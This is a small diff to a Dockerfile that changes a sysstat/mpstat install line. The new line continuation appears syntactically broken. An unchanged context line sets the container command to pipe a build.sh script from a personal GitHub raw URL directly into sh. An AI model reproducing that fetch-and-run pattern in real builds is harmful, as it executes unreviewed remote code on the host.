@@ -39,4 +39,6 @@ RUN echo "startbot.sh:" && ls /home/stuff/
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
 
-RUN sudo apt-get install sysstat && mpstat && mpstat 5 99999
+RUN apt-get install sysstat && mpstat \
+    mpstat 5 99999 \
+    
